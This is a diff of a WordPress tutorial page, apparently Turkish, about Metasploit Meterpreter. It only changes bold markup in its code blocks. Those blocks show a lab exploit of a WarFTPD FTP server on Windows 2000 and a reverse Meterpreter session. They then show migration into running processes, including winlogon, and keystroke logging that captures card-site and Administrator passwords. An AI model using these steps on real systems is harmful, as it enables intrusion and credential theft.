@@ -60,21 +60,21 @@ url: /tr/msf-meterpreter-kalicilik-saglama/
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit<strong>(</strong>warftpd_165_user<strong>)</strong> <strong>&gt;</strong> exploit
+<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit***(*** warftpd_165_user***)***  ***&gt;***  exploit
 
-<strong>[</strong><strong>*</strong><strong>]</strong> Handler binding to LHOST 0.0.0.0
-<strong>[</strong><strong>*</strong><strong>]</strong> Started reverse handler
-<strong>[</strong><strong>*</strong><strong>]</strong> Connecting to FTP server 172.16.104.145:21...
-<strong>[</strong><strong>*</strong><strong>]</strong> Connected to target FTP server.
-<strong>[</strong><strong>*</strong><strong>]</strong> Trying target Windows 2000 SP0-SP4 English...
-<strong>[</strong><strong>*</strong><strong>]</strong> Transmitting intermediate stager <strong>for </strong>over-sized stage...<strong>(</strong>191 bytes<strong>)</strong>
-<strong>[</strong><strong>*</strong><strong>]</strong> Sending stage <strong>(</strong>2650 bytes<strong>)</strong>
-<strong>[</strong><strong>*</strong><strong>]</strong> Sleeping before handling stage...
-<strong>[</strong><strong>*</strong><strong>]</strong> Uploading DLL <strong>(</strong>75787 bytes<strong>)</strong>...
-<strong>[</strong><strong>*</strong><strong>]</strong> Upload completed.
-<strong>[</strong><strong>*</strong><strong>]</strong> Meterpreter session 4 opened <strong>(</strong>172.16.104.130:4444 -&gt; 172.16.104.145:1246<strong>)</strong>
+***[*** ******* ***]***  Handler binding to LHOST 0.0.0.0
+***[*** ******* ***]***  Started reverse handler
+***[*** ******* ***]***  Connecting to FTP server 172.16.104.145:21...
+***[*** ******* ***]***  Connected to target FTP server.
+***[*** ******* ***]***  Trying target Windows 2000 SP0-SP4 English...
+***[*** ******* ***]***  Transmitting intermediate stager ***for *** over-sized stage...***(*** 191 bytes***)*** 
+***[*** ******* ***]***  Sending stage ***(*** 2650 bytes***)*** 
+***[*** ******* ***]***  Sleeping before handling stage...
+***[*** ******* ***]***  Uploading DLL ***(*** 75787 bytes***)*** ...
+***[*** ******* ***]***  Upload completed.
+***[*** ******* ***]***  Meterpreter session 4 opened ***(*** 172.16.104.130:4444 -&gt; 172.16.104.145:1246***)*** 
 
-meterpreter <strong>&gt;</strong>
+meterpreter ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 
@@ -82,10 +82,10 @@ meterpreter <strong>&gt;</strong>
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> ps
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  ps
 
 Process list
-<strong>============</strong>
+***============*** 
 
     PID   Name               Path                                                   
     ---   ----               ----                                                   
@@ -110,10 +110,10 @@ Process list
     972   TPAutoConnSvc.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe 
     1088  TPAutoConnect.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe 
 
-meterpreter <strong>&gt;</strong> migrate 768
-<strong>[</strong><strong>*</strong><strong>]</strong> Migrating to 768...
-<strong>[</strong><strong>*</strong><strong>]</strong> Migration completed successfully.
-meterpreter <strong>&gt;</strong> getpid
+meterpreter ***&gt;***  migrate 768
+***[*** ******* ***]***  Migrating to 768...
+***[*** ******* ***]***  Migration completed successfully.
+meterpreter ***&gt;***  getpid
 Current pid: 768
 </code></pre>
 <!-- /wp:code -->
@@ -122,9 +122,9 @@ Current pid: 768
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> keyscan_start
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  keyscan_start
 Starting the keystroke sniffer...
-meterpreter <strong>&gt;</strong> keyscan_dump
+meterpreter ***&gt;***  keyscan_dump
 Dumping captured keystrokes...
    tgoogle.cm my credit amex   myusernamthi     amexpasswordpassword
 </code></pre>
@@ -137,21 +137,21 @@ Dumping captured keystrokes...
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> ps
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  ps
 
 Process list
-<strong>=================</strong>
+***=================*** 
 
 PID Name         Path
 --- ----         ----
 401 winlogon.exe C:\WINNT\system32\winlogon.exe
 
-meterpreter <strong>&gt;</strong> migrate 401
+meterpreter ***&gt;***  migrate 401
 
-<strong>[</strong><strong>*</strong><strong>]</strong> Migrating to 401...
-<strong>[</strong><strong>*</strong><strong>]</strong> Migration completed successfully.
+***[*** ******* ***]***  Migrating to 401...
+***[*** ******* ***]***  Migration completed successfully.
 
-meterpreter <strong>&gt;</strong> keyscan_start
+meterpreter ***&gt;***  keyscan_start
 Starting the keystroke sniffer...
 </code></pre>
 <!-- /wp:code -->
@@ -160,7 +160,7 @@ Starting the keystroke sniffer...
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> keyscan_dump
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  keyscan_dump
 Dumping captured keystrokes...
 Administrator ohnoes1vebeenh4x0red!
 </code></pre>
